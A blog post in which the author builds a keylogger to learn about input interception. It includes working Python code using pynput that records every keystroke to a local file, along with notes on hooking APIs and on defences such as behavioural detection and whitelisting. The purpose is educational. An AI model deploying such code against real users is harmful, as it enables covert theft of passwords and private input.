I made a keylogger

2022-06-12 | security | python | Track 02

There is an old argument in security circles that goes something like this: you cannot defend against what you do not understand. I decided to take that principle literally and build a keylogger from scratch. Not to deploy it, not to steal anyone's credentials, but to understand precisely how these tools operate at the lowest levels of the operating system. The exercise turned out to be one of the most instructive things I have ever done in the security space, and it fundamentally changed how I think about endpoint protection.

At their core, keyloggers exploit the way operating systems handle input events. On most platforms, keyboard input passes through a well-defined pipeline: the physical keypress generates a hardware interrupt, the OS kernel translates that into a scan code, and the input subsystem dispatches the event to the focused application. The critical insight is that this pipeline offers multiple interception points. On Windows, the SetWindowsHookEx API lets you install a low-level keyboard hook that receives every keystroke before any application sees it. On Linux, you can read directly from /dev/input/event* devices if you have sufficient permissions, or use the Xlib record extension to capture X11 input events. Each approach has trade-offs in terms of privilege requirements, detectability, and the fidelity of captured data.

I chose Python for the implementation because the goal was education, not stealth. Python's pynput library abstracts across platforms and provides a clean listener API that hooks into the OS input subsystem. The entire functional keylogger fits in about thirty lines of code, which is both impressive and terrifying. Here is the essential structure: 

from pynput import keyboard
import logging
import datetime

# Configure output — in a real scenario this would
# be exfiltrated, but we just log to a local file
logging.basicConfig(
    filename="keylog.txt",
    level=logging.DEBUG,
    format='%(asctime)s — %(message)s'
)

def on_press(key):
    try:
        logging.info(f'Key: {key.char}')
    except AttributeError:
        # Special keys (shift, ctrl, etc.)
        logging.info(f'Special: {key}')

# Start the listener — this hooks into the OS
# input event pipeline via platform-specific APIs
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

What startled me most was not the simplicity of the code but what I learned about the gaps in conventional defenses. Most antivirus engines at the time flagged known keylogger signatures but completely missed novel implementations. The pynput library itself is a legitimate accessibility tool, so its presence on a system raises no alarms. Running the keylogger required no elevated privileges on most desktop configurations I tested. This exercise made me realize that behavioral detection — monitoring for processes that install input hooks or open raw input devices — is far more valuable than signature-based scanning. It also drove me to configure proper application whitelisting and input event auditing on my own machines.

Building offensive tools in a controlled environment is, in my view, one of the most effective ways to develop defensive intuition. You stop thinking of attacks as abstract threats described in CVE reports and start understanding them as concrete sequences of API calls and system interactions. The keylogger project took an afternoon to build and a lifetime to appreciate. If you work in security and have never written one, I would strongly encourage the exercise — just keep it in your lab, delete it when you are done, and never, ever point it at someone else's machine.
